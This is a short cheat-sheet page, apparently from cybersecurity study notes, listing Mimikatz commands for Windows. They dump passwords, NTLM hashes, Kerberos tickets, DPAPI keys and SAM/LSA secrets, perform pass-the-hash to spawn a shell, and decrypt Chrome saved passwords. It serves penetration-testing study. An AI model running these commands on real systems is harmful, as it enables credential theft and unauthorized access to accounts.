# Mimikatz

[![password_attacks](../../../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

<div class="row row-cols-lg-2"><div>

[mimikatz](https://github.com/gentilkiwi/mimikatz) <small>(18.5k ⭐)</small> is the most popular tool to dump Windows credentials or perform attacks such as [Pass-the-hash/Pass-the-ticket](/cybersecurity/red-team/s4.privesc/index.md#pass-the-xxx).

```shell!
PS> .\mimikatz.exe
mimikatz# privilege::debug
mimikatz# # run commands
mimikatz# exit
```

To dump credentials, hashes, tickets, etc. you can use:

```shell!
mimikatz# sekurlsa::logonPasswords full
mimikatz# sekurlsa::ekeys           # dump rc4+ntlm hashes
mimikatz# sekurlsa::dpapi           # dump DPAPI master key
mimikatz# sekurlsa::tickets /export # dump tickets
mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive
mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive /security:./security.hive
mimikatz# lsadump::lsa /patch
mimikatz# vault::list # list credential manager vaults
mimikatz# vault::cred # list credentials
```
</div><div>

To perform a pass-the-hash attack using a `rc4` or `NTML` hash:

```shell!
mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:xxx.yyy
mimikatz# sekurlsa::pth /user:xxx /rc4:XXX /domain:xxx.yyy /run:cmd.exe
mimikatz# sekurlsa::pth /user:xxx /ntlm:XXX /domain:xxx.yyy /run:cmd.exe
```

We can decrypt secrets encrypted using DPAPI master key using:

```shell!
mimikatz# dpapi::blob /in:"encrypted_file" /unprotect /masterkey:xxx
mimikatz# dpapi::chrome /in:".\Login Data" /unprotect /masterkey:xxx
```

To decrypt chrome passwords:

```shell!
mimikatz# dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

📚 See also: [pypykatz](pypykatz.md) for Linux users.
</div></div>